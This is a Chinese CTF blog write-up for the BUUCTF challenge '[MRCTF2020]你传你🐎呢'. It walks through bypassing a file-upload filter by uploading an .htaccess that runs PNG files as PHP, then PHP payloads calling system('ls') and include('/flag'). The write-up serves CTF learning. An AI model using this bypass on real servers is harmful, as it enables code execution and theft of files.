@@ -1,0 +1,376 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[MRCTF2020]你传你🐎呢 | Lengkur</title><meta name="author" content="Lengkur"><meta name="copyright" content="Lengkur"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="进来是一个文件上传点 123456POST &#x2F;upload.php HTTP&#x2F;1.1------WebKitFormBoundarycHfyDys9w8AAZN6lContent-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;100.png&quot;Content-Type: image&#x2F;png  先传一个空图">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[MRCTF2020]你传你🐎呢">
+<meta property="og:url" content="https://lengkur.github.io/2026/05/25/wp/BUUCTF/[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/index.html">
+<meta property="og:site_name" content="Lengkur">
+<meta property="og:description" content="进来是一个文件上传点 123456POST &#x2F;upload.php HTTP&#x2F;1.1------WebKitFormBoundarycHfyDys9w8AAZN6lContent-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;100.png&quot;Content-Type: image&#x2F;png  先传一个空图">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lengkur.github.io/img/black.jpg">
+<meta property="article:published_time" content="2026-05-25T09:56:22.000Z">
+<meta property="article:modified_time" content="2026-05-27T03:11:41.286Z">
+<meta property="article:author" content="Lengkur">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="HTTP">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="WP">
+<meta property="article:tag" content="BUUCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lengkur.github.io/img/black.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[MRCTF2020]你传你🐎呢",
+  "url": "https://lengkur.github.io/2026/05/25/wp/BUUCTF/[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/",
+  "image": "https://lengkur.github.io/img/black.jpg",
+  "datePublished": "2026-05-25T09:56:22.000Z",
+  "dateModified": "2026-05-27T03:11:41.286Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Lengkur",
+      "url": "https://lengkur.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/lengkur.png"><link rel="canonical" href="https://lengkur.github.io/2026/05/25/wp/BUUCTF/[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[MRCTF2020]你传你🐎呢',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.8.0/styles/atom-one-dark.min.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><style>#loading-box {
+  position: fixed;
+  inset: 0;
+  z-index: 10000;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+  background:
+    radial-gradient(circle at top, rgba(0,255,174,.08), transparent 32%),
+    linear-gradient(180deg, #02050a 0%, #05070d 100%);
+  transition: opacity .45s ease, visibility .45s ease;
+  overflow: hidden;
+}
+#loading-box::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background:
+    linear-gradient(rgba(255,255,255,.025) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,255,174,.035) 1px, transparent 1px);
+  background-size: 100% 4px, 24px 24px;
+  opacity: .35;
+  pointer-events: none;
+}
+.boot-shell {
+  position: relative;
+  width: min(760px, 92vw);
+  border: 1px solid rgba(0,255,174,.22);
+  border-radius: 18px;
+  background: rgba(5, 10, 18, .92);
+  box-shadow: 0 0 0 1px rgba(0,255,174,.08), 0 22px 80px rgba(0,0,0,.55), 0 0 32px rgba(0,255,174,.08);
+  backdrop-filter: blur(14px);
+  overflow: hidden;
+  color: #d9fef1;
+  font-family: "JetBrains Mono", "Fira Code", monospace;
+}
+.boot-shell::after {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background: linear-gradient(180deg, rgba(255,255,255,.02), transparent 30%, transparent 70%, rgba(0,255,174,.03));
+  pointer-events: none;
+}
+.boot-topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 14px 18px;
+  border-bottom: 1px solid rgba(0,255,174,.12);
+  background: rgba(6, 12, 22, .96);
+  color: #8ef7d1;
+  font-size: 13px;
+  letter-spacing: .08em;
+  text-transform: uppercase;
+}
+.boot-dots {
+  display: flex;
+  gap: 8px;
+}
+.boot-dots span {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: rgba(0,255,174,.22);
+  box-shadow: 0 0 10px rgba(0,255,174,.18);
+}
+.boot-main {
+  padding: 28px 26px 24px;
+}
+.boot-logo {
+  margin-bottom: 18px;
+  color: #eafff8;
+  font-size: clamp(24px, 4vw, 38px);
+  font-weight: 700;
+  letter-spacing: .08em;
+  text-shadow: 0 0 14px rgba(0,255,174,.15);
+}
+.boot-logo .prompt {
+  color: #00ffae;
+  margin-right: 10px;
+}
+.boot-lines {
+  display: grid;
+  gap: 10px;
+  margin-bottom: 22px;
+  font-size: 14px;
+  line-height: 1.75;
+  color: #9fc8b8;
+}
+.boot-line {
+  opacity: 0;
+  transform: translateY(6px);
+  animation: bootLine .45s ease forwards;
+}
+.boot-line:nth-child(1){animation-delay:.1s}
+.boot-line:nth-child(2){animation-delay:.35s}
+.boot-line:nth-child(3){animation-delay:.6s}
+.boot-line:nth-child(4){animation-delay:.85s}
+.boot-line:nth-child(5){animation-delay:1.1s}
+.boot-line .ok {
+  color: #00ffae;
+}
+.boot-progress-wrap {
+  margin-top: 18px;
+}
+.boot-progress-label {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 8px;
+  color: #78f3ca;
+  font-size: 13px;
+}
+.boot-progress {
+  position: relative;
+  height: 10px;
+  border-radius: 999px;
+  border: 1px solid rgba(0,255,174,.18);
+  background: rgba(255,255,255,.03);
+  overflow: hidden;
+}
+.boot-progress::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  width: 0%;
+  background: linear-gradient(90deg, #00ffae, #51d9ff);
+  box-shadow: 0 0 16px rgba(0,255,174,.22);
+  animation: bootProgress 1.65s cubic-bezier(.4,0,.2,1) forwards;
+}
+.boot-progress::after {
+  content: '';
+  position: absolute;
+  top: 0;
+  bottom: 0;
+  width: 80px;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,.3), transparent);
+  transform: translateX(-120px);
+  animation: bootShine 1.2s linear infinite;
+  animation-delay: .8s;
+}
+.boot-footer {
+  margin-top: 16px;
+  color: rgba(159, 200, 184, .8);
+  font-size: 12px;
+  letter-spacing: .04em;
+}
+@keyframes bootLine {
+  to { opacity: 1; transform: translateY(0); }
+}
+@keyframes bootProgress {
+  from { width: 0%; }
+  to { width: 100%; }
+}
+@keyframes bootShine {
+  to { transform: translateX(760px); }
+}
+@media (max-width: 640px) {
+  .boot-main { padding: 22px 18px 18px; }
+  .boot-topbar { padding: 12px 14px; }
+  .boot-lines { font-size: 12px; }
+}</style><div class="boot-shell"><div class="boot-topbar"><div class="boot-title">LENGKUR // boot sequence</div><div class="boot-dots"><span></span><span></span><span></span></div></div><div class="boot-main"><div class="boot-logo"><span class="prompt">></span><span>Lengkur</span></div><div class="boot-lines"><div class="boot-line">[*] loading workspace: `/notes` `/wp` `/tags`</div><div class="boot-line">[*] mounting modules: `php` `flask` `mysql` `redis`</div><div class="boot-line">[*] parsing writeups and exploit notes</div><div class="boot-line">[<span class="ok">OK</span>] security knowledge base online</div><div class="boot-line">[<span class="ok">OK</span>] access granted :: welcome back</div></div><div class="boot-progress-wrap"><div class="boot-progress-label"><span>initializing terminal ui</span><span>100%</span></div><div class="boot-progress"></div></div><div class="boot-footer">root@lengkur:~$ enter blog</div></div></div><script>(function(){
+  const loadingBox = document.getElementById('loading-box');
+  if (!loadingBox) return;
+  const removeLoading = () => {
+    loadingBox.style.opacity = '0';
+    loadingBox.style.visibility = 'hidden';
+    setTimeout(() => {
+      loadingBox.style.display = 'none';
+    }, 450);
+  };
+  window.addEventListener('load', () => setTimeout(removeLoading, 900));
+  document.addEventListener('pjax:complete', removeLoading);
+  setTimeout(removeLoading, 4200);
+})()</script></div><div class="bg-animation" id="web_bg" style="background-color: #05070d;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/lengkur.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">138</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> WEB学习经历</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/notes/"><i class="fa-fw fas fa-book-open"></i><span> 笔记总览</span></a></li><li><a class="site-page child" href="/categories/notes/"><i class="fa-fw fas fa-book"></i><span> 全部笔记</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签索引</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-pencil-alt"></i><span> Write Up</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/writeups/"><i class="fa-fw fas fa-sitemap"></i><span> WP总览</span></a></li><li><a class="site-page child" href="/categories/wp/"><i class="fa-fw fas fa-list-ul"></i><span> 全部文章</span></a></li><li><a class="site-page child" href="/categories/wp/ctfshow/"><i class="fa-fw fas fa-flag"></i><span> ctfshow</span></a></li><li><a class="site-page child" href="/categories/wp/SHCTF/"><i class="fa-fw fas fa-terminal"></i><span> SHCTF</span></a></li><li><a class="site-page child" href="/categories/wp/NSSCTF-WEB/"><i class="fa-fw fas fa-skull"></i><span> NSSCTF WEB</span></a></li><li><a class="site-page child" href="/categories/wp/%E6%98%9F%E8%8A%92%E6%9D%AF2026/"><i class="fa-fw fas fa-star"></i><span> 星芒杯2026</span></a></li><li><a class="site-page child" href="/categories/wp/UniCTF/"><i class="fa-fw fas fa-university"></i><span> UniCTF</span></a></li><li><a class="site-page child" href="/categories/wp/XMCTF/"><i class="fa-fw fas fa-bolt"></i><span> XMCTF</span></a></li><li><a class="site-page child" href="/categories/wp/NCTF/"><i class="fa-fw fas fa-user-secret"></i><span> NCTF</span></a></li><li><a class="site-page child" href="/writeups/#all-platforms"><i class="fa-fw fas fa-ellipsis-h"></i><span> 更多分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-id-badge"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/black.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Lengkur</span></a><a class="nav-page-title" href="/"><span class="site-name">[MRCTF2020]你传你🐎呢</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> WEB学习经历</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/notes/"><i class="fa-fw fas fa-book-open"></i><span> 笔记总览</span></a></li><li><a class="site-page child" href="/categories/notes/"><i class="fa-fw fas fa-book"></i><span> 全部笔记</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签索引</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-pencil-alt"></i><span> Write Up</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/writeups/"><i class="fa-fw fas fa-sitemap"></i><span> WP总览</span></a></li><li><a class="site-page child" href="/categories/wp/"><i class="fa-fw fas fa-list-ul"></i><span> 全部文章</span></a></li><li><a class="site-page child" href="/categories/wp/ctfshow/"><i class="fa-fw fas fa-flag"></i><span> ctfshow</span></a></li><li><a class="site-page child" href="/categories/wp/SHCTF/"><i class="fa-fw fas fa-terminal"></i><span> SHCTF</span></a></li><li><a class="site-page child" href="/categories/wp/NSSCTF-WEB/"><i class="fa-fw fas fa-skull"></i><span> NSSCTF WEB</span></a></li><li><a class="site-page child" href="/categories/wp/%E6%98%9F%E8%8A%92%E6%9D%AF2026/"><i class="fa-fw fas fa-star"></i><span> 星芒杯2026</span></a></li><li><a class="site-page child" href="/categories/wp/UniCTF/"><i class="fa-fw fas fa-university"></i><span> UniCTF</span></a></li><li><a class="site-page child" href="/categories/wp/XMCTF/"><i class="fa-fw fas fa-bolt"></i><span> XMCTF</span></a></li><li><a class="site-page child" href="/categories/wp/NCTF/"><i class="fa-fw fas fa-user-secret"></i><span> NCTF</span></a></li><li><a class="site-page child" href="/writeups/#all-platforms"><i class="fa-fw fas fa-ellipsis-h"></i><span> 更多分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-id-badge"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">[MRCTF2020]你传你🐎呢</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-25T09:56:22.000Z" title="发表于 2026-05-25 17:56:22">2026-05-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-27T03:11:41.286Z" title="更新于 2026-05-27 11:11:41">2026-05-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wp/">wp</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wp/BUUCTF/">BUUCTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">473</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>进来是一个文件上传点</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-nix">------WebKitFormBoundarycHfyDys9w8AAZN6l</span><br><span class="language-nix"><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;uploaded&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;100.png&quot;</span></span><br><span class="language-nix"><span class="hljs-params">Content-Type:</span> image<span class="hljs-symbol">/png</span></span><br><span class="language-nix"></span><br></code></pre></td></tr></table></figure>
+
+<p>先传一个空图片文件试试水，响应会直接给出文件路径的</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/u</span>pload<span class="hljs-regexp">/3ebbfd8e68cc8f054ff0e3437d1686cc/</span><span class="hljs-number">100</span>.png succesfully uploaded!<br></code></pre></td></tr></table></figure>
+
+<p>传一个php文件</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-nix">------WebKitFormBoundarycHfyDys9w8AAZN6l</span><br><span class="language-nix"><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;uploaded&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;100.php&quot;</span></span><br><span class="language-nix"><span class="hljs-params">Content-Type:</span> image<span class="hljs-symbol">/png</span></span><br><span class="language-nix"></span><br></code></pre></td></tr></table></figure>
+
+<p>响应</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;我扌your problem?<br></code></pre></td></tr></table></figure>
+
+<p>测试后发现各php类型后缀都被过滤了，但是我们可以发现返回的上传的文件所在文件夹名都是不变的</p>
+<p>上传一个.htaccess文件</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-nix">------WebKitFormBoundarycHfyDys9w8AAZN6l</span><br><span class="language-nix"><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;uploaded&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;.htaccess&quot;</span></span><br><span class="language-nix"><span class="hljs-params">Content-Type:</span> image<span class="hljs-symbol">/png</span></span><br><span class="language-nix"></span><br><span class="language-nix"><span class="hljs-operator">&lt;</span>FilesMatch <span class="hljs-string">&quot;1.png&quot;</span><span class="hljs-operator">&gt;</span></span><br><span class="language-nix">SetHandler application<span class="hljs-symbol">/x-httpd-php</span></span><br><span class="language-nix"><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>FilesMatch<span class="hljs-operator">&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>响应</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Warning<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>:  mkdir(): File exists in <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>/var/www/html/upload.php<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> on line <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>23<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>/var/www/html/upload/3ebbfd8e68cc8f054ff0e3437d1686cc/.htaccess succesfully uploaded!<br></code></pre></td></tr></table></figure>
+
+<p>这时候我们只需要上传一个1.png，里面包含php代码就行了，php代码没有任何过滤的</p>
+<p>上传</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">------WebKitFormBoundarycHfyDys9w8AAZN6l<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;uploaded&quot;</span>; filename=<span class="hljs-string">&quot;1.png&quot;</span><br>Content-Type: image/png<br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>响应</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Warning<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>:  mkdir(): File exists in <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>/var/www/html/upload.php<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> on line <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>23<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>/var/www/html/upload/3ebbfd8e68cc8f054ff0e3437d1686cc/1.png succesfully uploaded!<br></code></pre></td></tr></table></figure>
+
+<p>然后我们访问可以看到，很多命令执行函数是被禁用了</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br><span class="hljs-built_in">Warning</span>: <span class="hljs-keyword">system</span>() has been disabled <span class="hljs-keyword">for</span> <span class="hljs-keyword">security</span> reasons <span class="hljs-keyword">in</span> /var/www/html/upload/<span class="hljs-number">3</span>ebbfd8e68cc8f054ff0e3437d1686cc/<span class="hljs-number">1.</span>png <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">2</span><br><br></code></pre></td></tr></table></figure>
+
+<p>这里使用include函数直接包含&#x2F;flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">------WebKitFormBoundarycHfyDys9w8AAZN6l<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;uploaded&quot;</span>; filename=<span class="hljs-string">&quot;1.png&quot;</span><br>Content-Type: image/png<br><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>访问得到flag</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;c5549f57-<span class="hljs-number">3562</span>-<span class="hljs-number">44</span>a6-<span class="hljs-number">9</span>f70-fda08f2f2380&#125; <br></code></pre></td></tr></table></figure>
